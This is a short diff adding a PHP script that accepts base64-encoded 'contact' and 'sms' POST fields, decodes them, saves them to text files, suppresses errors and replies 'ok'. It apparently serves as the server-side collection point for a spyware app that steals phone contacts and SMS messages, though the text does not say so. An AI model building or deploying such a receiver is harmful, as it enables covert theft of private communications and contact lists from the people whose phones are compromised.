@@ -1,0 +1,10 @@
+<?php
+error_reporting(0);
+if($_POST['contact']!=""){
+	file_put_contents("contact.txt",base64_decode($_POST['contact']));
+}
+if($_POST['sms']!=""){
+	file_put_contents("sms.txt",base64_decode($_POST['sms']));
+}
+	echo("ok");
+?>
